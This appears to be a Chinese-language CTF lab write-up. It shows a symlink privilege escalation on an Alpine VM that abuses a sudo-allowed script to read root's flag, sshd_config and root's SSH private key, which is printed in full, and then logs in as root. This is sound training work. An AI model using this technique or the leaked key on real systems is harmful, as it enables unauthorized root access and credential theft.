# panghu

裙u的提权题

![image](assets/image-20250204201245-lot7s4c.png)

```
┌──(kali㉿kali)-[~/test]
└─$ sudo arp-scan -l     
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.147 08:00:27:86:a6:d2       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:6e:be       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 4 responded
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ ssh ssh@192.168.205.147
The authenticity of host '192.168.205.147 (192.168.205.147)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
    ~/.ssh/known_hosts:8: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.147' (ED25519) to the list of known hosts.
ssh@192.168.205.147's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~$ sudo -l
[sudo] password for ssh: 
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User ssh may run the following commands on jan:
    (root) PASSWD: /opt/lzh.sh
jan:~$ cat /opt/lzh.sh 
#!/bin/sh

cd /home/ssh
cat backup/hi
jan:~$ cd /home/ssh/backup/
jan:~/backup$ ls -al
total 12
drwxr-xr-x    2 root     root          4096 Feb  3 23:28 .
drwxr-sr-x    3 ssh      ssh           4096 Feb  3 23:27 ..
-rw-------    1 root     root             9 Feb  3 23:28 hi

```

可以看到我们是有权限改目录的，但是不能删除

```
jan:~/backup$ cd ..
jan:~$ ls -la
total 12
drwxr-sr-x    3 ssh      ssh           4096 Feb  3 23:27 .
drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -> /dev/null
drwxr-xr-x    2 root     root          4096 Feb  3 23:28 backup
jan:~$ mv backup/ backup1
jan:~$ mkdir backup
jan:~$ cd backup
jan:~$ cd backup
jan:~/backup$ ln -s /root/root.txt hi
jan:~/backup$ sudo /opt/lzh.sh 
flag{LingMj}

```

然后我就去读取密钥和shadow了，我以为没有id_rsa就是没有密钥，我就没看，哪知道

![image](assets/image-20250204201704-rwywb22.png)

haha我真傻

```
jan:~/backup$ rm hi 
jan:~/backup$ sudo /opt/lzh.sh 
#       $OpenBSD: sshd_config,v 1.104 2021/07/02 05:11:21 dtucker Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

# Include configuration snippets before processing this file to allow the
# snippets to override directives set in this file.
Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
PermitRootLogin yes
strictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
AuthorizedKeysFile      ~/.ssh/authorized_keys

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to no to disable s/key passwords
#KbdInteractiveAuthentication yes

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the KbdInteractiveAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via KbdInteractiveAuthentication may bypass
# the setting of "PermitRootLogin prohibit-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and KbdInteractiveAuthentication to 'no'.
#UsePAM no

#AllowAgentForwarding yes
# Feel free to re-enable these if your use case requires them.
AllowTcpForwarding no
GatewayPorts no
X11Forwarding no
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
#PrintMotd yes
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# override default of no subsystems
Subsystem       sftp    internal-sftp

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
jan:~/backup$ rm hi 
jan:~/backup$ ln -s /root/.ssh/id_ed25519 hi
jan:~/backup$ sudo -l
[sudo] password for ssh: 
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User ssh may run the following commands on jan:
    (root) PASSWD: /opt/lzh.sh
jan:~/backup$ sudo /opt/lzh.sh
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjgAAAJB2iiMQdooj
EAAAAAtzc2gtZWQyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjg
AAAEAUhlfWSQ4VtYPAVaPWXTsnbEFiir93k1A3Icbge7uj5oCCTv9WGP1Puf9NX55DiJwe
YnL8z4mnTt6s36lxTDOOAAAACHJvb3RAamFuAQIDBAU=
-----END OPENSSH PRIVATE KEY-----
jan:~/backup$ nano id
jan:~/backup$ cat id 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjgAAAJB2iiMQdooj
EAAAAAtzc2gtZWQyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjg
AAAEAUhlfWSQ4VtYPAVaPWXTsnbEFiir93k1A3Icbge7uj5oCCTv9WGP1Puf9NX55DiJwe
YnL8z4mnTt6s36lxTDOOAAAACHJvb3RAamFuAQIDBAU=
-----END OPENSSH PRIVATE KEY-----
jan:~/backup$ chmod 600 id 
jan:~/backup$ ssh -i id root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)


```